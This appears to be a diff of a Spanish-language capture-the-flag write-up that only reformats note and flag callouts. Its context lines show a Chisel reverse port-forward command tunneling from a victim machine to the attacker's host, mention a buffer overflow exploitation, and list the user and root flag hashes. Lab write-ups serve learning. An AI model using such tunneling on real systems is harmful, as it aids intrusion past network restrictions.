@@ -181,7 +181,7 @@ Luego, subí el cliente de Chisel a la máquina víctima y lo ejecuté para que 
 chisel.exe client 10.10.14.17:9999 R:8888:127.0.0.1:8888
 ```
 
-[!NOTE] El _port forwarding_ reverso (`R:`) es crucial aquí. Le indica al cliente de Chisel que exponga un puerto remoto en el servidor. Cualquier conexión que yo haga a `localhost:8888` en mi máquina será redirigida a través del túnel hasta `127.0.0.1:8888` en la máquina víctima.
+[!note] El _port forwarding_ reverso (`R:`) es crucial aquí. Le indica al cliente de Chisel que exponga un puerto remoto en el servidor. Cualquier conexión que yo haga a `localhost:8888` en mi máquina será redirigida a través del túnel hasta `127.0.0.1:8888` en la máquina víctima.
 
 ### Explotación del Buffer Overflow
 
@@ -233,10 +233,10 @@ La explotación fue exitosa y recibí una shell en mi listener con privilegios d
 
 ## Bandera(s)
 
-> [!FLAG] `flag{user}`
+> [!flag] `flag{user}`
 > d5825b21d081fc5ed4264482618816f2
-^bandera
+^bandera-user
 
-> [!FLAG] `flag{root}`
+> [!flag] `flag{root}`
 > 3b5b91a3b40f83d219d46816231854c4
-^bandera
+^bandera-root
